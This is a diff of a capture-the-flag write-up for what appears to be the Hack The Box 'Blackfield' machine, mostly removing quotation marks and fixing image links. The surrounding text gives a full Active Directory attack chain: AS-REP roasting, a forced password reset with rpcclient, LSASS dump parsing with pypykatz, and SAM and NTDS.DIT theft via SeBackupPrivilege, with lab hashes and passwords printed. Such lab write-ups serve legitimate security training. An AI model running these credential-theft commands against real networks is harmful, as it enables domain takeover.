@@ -112,7 +112,7 @@ smb: \> ls
 
 The list is quite long. Remember that usernames are always good to have, we can try multiple attacks with them. 
 
-Let's extract the usernames from that list. We can do that with Bash copying the "raw list" into raw_usernames.txt to create a list with only the usernames named usernames.txt:
+Let's extract the usernames from that list. We can do that with Bash copying the raw list into raw_usernames.txt to create a list with only the usernames named usernames.txt:
 ```shell
 cat raw_usernames.txt | awk '{print $1}' > usernames.txt
 ```
@@ -136,15 +136,15 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] No passwords were discovered :'(
 ```
 
-This is great, we got 3 valid users and the user "support" has PreAuth (Pre-authentication) disabled. This means we can do an AS-REP Roast attack on the "support" account!
+This is great, we got 3 valid users and the user support has PreAuth (Pre-authentication) disabled. This means we can do an AS-REP Roast attack on the support account!
 
 # Foothold
 ## AS-REP Roasting on the "support" user
-We will use impacket-GetNPUsers to do an AS-REP Roasting attack on the "support" user:
+We will use impacket-GetNPUsers to do an AS-REP Roasting attack on the user support:
 ```shell
 impacket-GetNPUsers blackfield.local/support -dc-ip 10.129.191.43 -no-pass
 ```
-And... yes! We got the hash of the user "support"!
+We got the hash of the user support. Nice!
 ```shell
 $krb5asrep$23$support@BLACKFIELD.LOCAL:02ee82412322b915bcdb39d389965421$111f1e4dadd6ffc86b3ee321a04f97bb0aadc3131133f41f3ca3f73b2f1ad3ab044365d4eb6fc88ea48763211754afad019c3bfaec593590d5afc788fdbe59149711499ea858813522d28ee0da3714587af847a63b3903721f090e19073216599f1f6ba125a8adad5a9ba53edce69388be7fd3bb5aabf816511af83d93bce9e408963d61067cdaaefb62caba1d3a50a10aa5892da70a7cb5f9eaa225a3d1b818da389d603edf921000e21e8f18a12b1a905a7f3b4bbb55628d25747e6e0bcbbd2dcd60c630cc8e121b8052182a04b1681197a61a45a225c967a34d404f3e031e00a6a132eff0db70b68c2fc8eafb71600f5944ca
 ```
@@ -177,17 +177,17 @@ sudo bloodhound
 ```
 Clear the database and upload the .json files into BloodHound.
 
-On the search box enter "SUPPORT@BLACKFIELD.LOCAL":
-[Search box](/images/bh_blackfield_1.png)
+On the search box enter SUPPORT@BLACKFIELD.LOCAL:
+![Search box](/images/bh_blackfield_1.png)
 
 And now click on the SUPPORT@BLACKFIELD.LOCAL user (Green person icon):
-[Click on user](/images/bh_blackfield_2.png)
+![Click on user](/images/bh_blackfield_2.png)
 
-Scroll down to "Outbound Object Control" section and click on "First Degree Object Control":
-[First Degree Object Control](/images/bh_blackfield_3.png)
+Scroll down to Outbound Object Control section and click on First Degree Object Control:
+![First Degree Object Control](/images/bh_blackfield_3.png)
 
-Now we can see that the user "support" has "ForceChangePassword" rights over the user "audit2020". This means we can change the password of the user "audit2020" using the user "support" without needing to know the current password of the user "audit2020".
-[The user "support" has "ForceChangePassword" rights over the user "audit2020"](/images/bh_blackfield_4.png)
+Now we can see that the user support has ForceChangePassword rights over the user audit2020. This means we can change the password of the user audit2020 using the user support without needing to know the current password of the user audit2020.
+![The user support has ForceChangePassword rights over the user audit2020](/images/bh_blackfield_4.png)
 
 ## Changing the Password of the user audit2020 using rpcclient
 We can change the password of the user audit2020 using rpcclient with the following commands:
@@ -196,7 +196,7 @@ rpcclient 10.129.191.43 -U "support"
 # Password for [WORKGROUP\support]: #00^BlackKnight
 rpcclient $> setuserinfo2 audit2020 23 Password123
 ```
-Now we successfully changed the password of the user "audit2020" to "Password123".
+Now we successfully changed the password of the user audit2020 to Password123.
 
 ```shell
 # Note: Running only setuserinfo2 without parameter will show the usage
@@ -213,10 +213,10 @@ SMB         10.129.191.43   445    DC01             [*] Windows 10 / Server 2019
 SMB         10.129.191.43   445    DC01             [+] BLACKFIELD.local\audit2020:Password123
 ```
 
-We can see on the results that the new credentials are indeed valid!
+We can see on the results that the new credentials are indeed valid.
 
 ## Accessing SMB Share "forensic" using the user "audit2020"
-With the new credentials we can proceed to enumerate the user audit2020. Evil-WinRM didn't work but we can see that the user "audit2020" has read access to the SMB Share "forensic":
+With the new credentials we can proceed to enumerate the user audit2020. Evil-WinRM didn't work but we can see that the user audit2020 has read access to the SMB Share forensic:
 ```shell
 nxc smb 10.129.191.43 -u audit2020 -p Password123 --shares
 ```
@@ -235,7 +235,7 @@ SMB         10.129.191.43   445    DC01             NETLOGON        READ        
 SMB         10.129.191.43   445    DC01             profiles$       READ            
 SMB         10.129.191.43   445    DC01             SYSVOL          READ            Logon server share
 ```
-Let's proceed to enumerate the "forensic" SMB Share. Inside \memory_analysis we can find a "lsass.zip" file, which we can download using "get":
+Let's proceed to enumerate the forensic SMB Share. Inside \memory_analysis we can find a lsass.zip file, which we can download using the get command:
 ```shell
 smbclient \\\\10.129.191.43\\forensic -U "audit2020"
 # Password for [WORKGROUP\audit2020]: Password123
@@ -275,7 +275,7 @@ Now we can extract the lsass.zip file on Kali and use pypykatz to dump the conte
 unzip lsass.zip
 pypykatz lsa minidump lsass.DMP
 ```
-We got many hashes from the dump, but after testing them we will find out that the only valid hash is the hash for the user "svc_backup":
+We got many hashes from the dump, but after testing them we will find out that the only valid hash is the hash for the user svc_backup:
 ```shell
 9658d1d1dcd9250115e2205d9f48400d
 ```
@@ -299,7 +299,7 @@ type C:\Users\svc_backup\Desktop\user.txt
 ```
 # Privilege Escalation
 ## Abusing SeBackupPrivilege as svc_backup to Dump SAM
-After getting access as user "svc_backup", we run whoami /priv to check the privileges of this user:
+After getting access as user svc_backup, we run whoami /priv to check the privileges of this user:
 ```shell
 whoami /priv
 ```
@@ -318,7 +318,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
-Here we can see that the user "svc_backup" has SeBackupPrivilege enabled.
+Here we can see that the user svc_backup has SeBackupPrivilege enabled.
 
 We can abuse this to dump the local SAM using the following commands:
 ```shell
@@ -326,7 +326,7 @@ reg save HKLM\SAM C:\Windows\Temp\SAM
 reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
 ```
 
-Then we can move the files using the "download" command in evil-winrm:
+Then we can move the files using the download command in evil-winrm:
 ```shell
 cd C:\Windows\Temp
 download SAM
@@ -489,7 +489,7 @@ cd C:\Windows\Temp
 reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
 ```
 
-And finally move the NTDS.DIT and SYSTEM files to our Kali using "download" on evil-winrm session:
+And finally move the NTDS.DIT and SYSTEM files to our Kali using download on evil-winrm session:
 ```shell
 download NTDS.DIT
 download SYSTEM
